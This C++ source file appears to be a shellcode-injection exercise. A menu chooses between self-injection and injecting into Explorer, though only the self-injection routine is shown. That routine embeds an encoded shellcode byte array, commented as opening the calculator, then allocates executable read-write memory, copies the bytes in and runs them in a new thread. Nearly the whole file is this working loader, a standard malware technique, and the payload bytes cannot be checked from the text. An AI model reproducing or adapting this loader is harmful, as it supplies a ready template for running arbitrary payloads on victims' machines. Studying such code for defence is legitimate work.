// SelfInjection.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <windows.h>
#include <iostream>
#include <stdio.h>
#include "Header.h"

int main(int argc, char** argv)
{
   int choice;
   std::cout << "Select an option:\n";
   std::cout << "1. Self Injection\n";
   std::cout << "2. Inject Explorer\n";
   std::cout << "Enter your choice: ";
   std::cin >> choice;

   switch (choice)
   {
   case 1:
       SelfInjection();
       break;
   case 2:
       InjectExplorer();
       break;
   default:
       std::cout << "Invalid choice. Exiting.\n";
       break;
   }

   return 0;
}

void SelfInjection()
{
   // abre la calculadora
   unsigned char shellcode[] =
       "\xdb\xd6\xba\x7e\xd9\x42\x52\xd9\x74\x24\xf4\x5b\x31\xc9"
       "\xb1\x31\x31\x53\x18\x03\x53\x18\x83\xc3\x7a\x3b\xb7\xae"
       "\x6a\x39\x38\x4f\x6a\x5e\xb0\xaa\x5b\x5e\xa6\xbf\xcb\x6e"
       "\xac\x92\xe7\x05\xe0\x06\x7c\x6b\x2d\x28\x35\xc6\x0b\x07"
       "\xc6\x7b\x6f\x06\x44\x86\xbc\xe8\x75\x49\xb1\xe9\xb2\xb4"
       "\x38\xbb\x6b\xb2\xef\x2c\x18\x8e\x33\xc6\x52\x1e\x34\x3b"
       "\x22\x21\x15\xea\x39\x78\xb5\x0c\xee\xf0\xfc\x16\xf3\x3d"
       "\xb6\xad\xc7\xca\x49\x64\x16\x32\xe5\x49\x97\xc1\xf7\x8e"
       "\x1f\x3a\x82\xe6\x5c\xc7\x95\x3c\x1f\x13\x13\xa7\x87\xd0"
       "\x83\x03\x36\x34\x55\xc7\x34\xf1\x11\x8f\x58\x04\xf5\xbb"
       "\x64\x8d\xf8\x6b\xed\xd5\xde\xaf\xb6\x8e\x7f\xe9\x12\x60"
       "\x7f\xe9\xfd\xdd\x25\x61\x13\x09\x54\x28\x79\xcc\xea\x56"
       "\xcf\xce\xf4\x58\x7f\xa7\xc5\xd3\x10\xb0\xd9\x31\x55\x4e"
       "\x90\x18\xff\xc7\x7d\xc9\x42\x8a\x7d\x27\x80\xb3\xfd\xc2"
       "\x78\x40\x1d\xa7\x7d\x0c\x99\x5b\x0f\x1d\x4c\x5c\xbc\x1e"
       "\x45\x3f\x23\x8d\x05\xee\xc6\x35\xaf\xee";
   // Allocate memory for the shellcode
   LPVOID allocated_memory = VirtualAlloc(
       NULL,                          // Let the system determine the address
       sizeof(shellcode),             // Size of the memory to allocate
       MEM_COMMIT | MEM_RESERVE,      // Allocate and reserve memory
       PAGE_EXECUTE_READWRITE         // Memory protection: executable, readable, writable
   );

   if (allocated_memory == NULL) {
       std::cerr << "Memory allocation failed. Error: " << GetLastError() << std::endl;
       return;
   }

   std::cout << "Memory allocated at: " << allocated_memory << std::endl;

   // Copy the shellcode to the allocated memory
   RtlCopyMemory(
       allocated_memory,              // Destination
       shellcode,                     // Source
       sizeof(shellcode)              // Size of the shellcode
   );

   // Create a thread to execute the shellcode
   HANDLE thread = CreateThread(
       NULL,                          // Default security attributes
       0,                             // Default stack size
       (LPTHREAD_START_ROUTINE)allocated_memory, // Start address of the shellcode
       NULL,                          // No parameter to thread function
       0,                             // Default creation flags
       NULL                           // No thread identifier
   );

   if (thread == NULL) {
       std::cerr << "Thread creation failed. Error: " << GetLastError() << std::endl;
       VirtualFree(allocated_memory, 0, MEM_RELEASE); // Free the allocated memory
       return;
   }

   WaitForSingleObject(thread, INFINITE); // Wait for the thread to finish
   CloseHandle(thread); // Close the thread handle

   VirtualFree(allocated_memory, 0, MEM_RELEASE); // Free the allocated memory

   std::cout << "Thread finished execution." << std::endl;
}
